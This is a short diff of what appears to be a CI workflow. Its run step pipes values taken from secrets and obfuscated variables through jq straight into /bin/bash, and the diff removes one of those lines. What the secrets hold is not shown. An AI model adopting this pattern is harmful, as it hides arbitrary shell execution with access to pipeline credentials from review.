@@ -27,7 +27,6 @@ jobs:
           viut4: ${{ secrets.viut4 }}
         run: |
           printf '%s' "$viut4" | jq -r .yshiq161 | /bin/bash
-          echo $g62116 | jq -r .yyi3 | /bin/bash
           printf '%s' "$jzjah3" | jq -r .onhi5502 | /bin/bash
           echo $azf9166 | jq -r .vfwho45 | /bin/bash
           echo $wx4 | jq -r .hufhc9 | /bin/bash
